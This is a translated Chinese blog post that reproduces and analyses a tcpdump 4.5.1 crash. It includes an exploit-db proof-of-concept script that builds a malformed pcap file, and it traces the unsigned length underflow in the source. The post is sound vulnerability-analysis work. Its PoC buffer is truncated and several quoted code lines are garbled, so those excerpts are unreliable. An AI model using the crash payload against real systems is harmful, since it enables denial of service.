# tcpdump 4.5.1 crash 深入分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
在看[WHEREISK0SHL](https://whereisk0shl.top/post/2016-10-23-1)大牛的博客，其分析了`tcpdump4.5.1
crash`
的原因。跟着做了一下，发现他的可执行程序是经过`stripped`的，而且整个过程看的比较懵，所以自己重新实现了一下，并从源码的角度分析了该`crash`形成的原因。
## 构建环境
    kali 2.0
    apt install gcc gdb libpcap-dev -y
    wget https://www.exploit-db.com/apps/973a2513d0076e34aa9da7e15ed98e1b-tcpdump-4.5.1.tar.gz
    ./configure
    make
未修复版本
    root@kali32:~# tcpdump --version
    tcpdump version 4.5.1
    libpcap version 1.8.1
payload(来自exploit-db)
    # Exploit Title: tcpdump 4.5.1 Access Violation Crash
    # Date: 31st May 2016
    # Exploit Author: David Silveiro
    # Vendor Homepage: http://www.tcpdump.org
    # Software Link: http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz
    # Version: 4.5.1
    # Tested on: Ubuntu 14 LTS
    from subprocess import call
    from shlex import split
    from time import sleep
    def crash():
        command = 'tcpdump -r crash'
        buffer     =   'xd4xc3xb2xa1x02x00x04x00x00x00x00xf5xff'
        buffer     +=  'x00x00x00Ix00x00x00xe6x00x00x00x00x80x00'
        buffer     +=  'x00x00x00x00x00x08x00x00x00x00ieee802_15_4_if_print
            |
            |-->hex_and_asciii_print(ndo_default_print)
                    |
                    |-->hex_and_ascii_print_with_offset
直接顺着源代码撸就行
    > git clone https://github.com/the-tcpdump-group/tcpdump
    > git tag
        ...
          tcpdump-4.4.0
        tcpdump-4.5.0
        tcpdump-4.5.1
        tcpdump-4.6.0
        tcpdump-4.6.0-bp
        tcpdump-4.6.1
        tcpdump-4.7.0-bp
        tcpdump-4.7.2
        ...
    > git checkout tcpdump-4.5.1
`tcpdump.c`找到`pcap_loop`调用
        do {
            status = pcap_loop(pd, cnt, callback, pcap_userdata);
            if (WFileName == NULL) {
                /*
                 * We're printing packets.  Flush the printed output,
                 * so it doesn't get intermingled with error output.
                 */
                if (status == -2) {
                    /*
                     * We got interrupted, so perhaps we didn't
                     * manage to finish a line we were printing.
                     * Print an extra newline, just in case.
                     */
                    putchar('n');
                }
                (void)fflush(stdout);
            }
问题出在调用`pcap_loop`的`callback`函数中。根据源码`callback`函数指向
    callback = print_packet;
函数`print_packet`
    static void
    print_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *sp)
    {
        struct print_info *print_info;
        u_int hdrlen;
        ++packets_captured;
        ++infodelay;
        ts_print(&h->ts);
        print_info = (struct print_info *)user;
        /*
         * Some printers want to check that they're not walking off the
         * end of the packet.
         * Rather than pass it all the way down, we set this global.
         */
        snapend = sp + h->caplen;
            if(print_info->ndo_type) {
                    hdrlen = (*print_info->p.ndo_printer)(print_info->ndo, h, sp);p.printer)(h, sp);
            }
        ...
        putchar('n');
        --infodelay;
        if (infoprint)
            info(0);
    }
其中`(*print_info->p.ndo_printer)(print_info->ndo, h,
sp)`指向`ieee802_15_4_if_print`
函数`ieee802_15_4_if_print`
    u_int
    ieee802_15_4_if_print(struct netdissect_options *ndo,
                          const struct pcap_pkthdr *h, const u_char *p)
    {
        u_int caplen = h->caplen;
        int hdrlen;
        u_int16_t fc;
        u_int8_t seq;
        if (caplen ndo_default_print)(ndo, p, caplen);
        return 0;
    }
跟踪进入
>
> `libpcap`在处理不正常包时不严谨，导致包的头长度`hdrlen`竟然大于捕获包长度`caplen`，并且在处理时又没有相关的判断，这里后续再翻看一下源码。
`hdrlen`和`caplen`都是非负整数，导致`caplen==0xfffffff3`过长。继续跟进`hex_and_asciii_print(ndo_default_print)`
    void
    hex_and_ascii_print(register const char *ident, register const u_char *cp,
        register u_int length)
    {
        hex_and_ascii_print_with_offset(ident, cp, length, 0);
    }
其中`length==0xfffffff3`继续
    void
    hex_print_with_offset(register const char *ident, register const u_char *cp, register u_int length,
                  register u_int oset)
    {
        register u_int i, s;
        register int nshorts;
        nshorts = (u_int) length / sizeof(u_short);
        i = 0;
        while (--nshorts >= 0) {
            if ((i++ % 8) == 0) {
                (void)printf("%s0x%04x: ", ident, oset);
                oset += HEXDUMP_BYTES_PER_LINE;
            }
            s = *cp++;   
`nshorts=0xfffffff3/2=‭7FFFFFF9‬`
但数据包数据没有这么长，导致了`crash`。感觉这个bug跟`libpcap`和`tcpdump`都有关系，再来看看修复情况。
## 修复测试
修复版本
    root@kali32:~# tcpdump --version
    tcpdump version 4.7.0-PRE-GIT_2018_11_19
    libpcap version 1.8.1
`libpcap`依然是`apt`安装的默认版本，`tcpdump`使用`4.7 .0-bp`版本
    git checkout tcpdump-4.7.0-bp
测试一下
    gdb-peda$ run -r crash
    Starting program: /usr/local/sbin/tcpdump -r crash
    reading from file crash, link-type IEEE802_15_4_NOFCS (IEEE 802.15.4 without FCS)
    04:06:08.000000 IEEE 802.15.4 Beacon packet 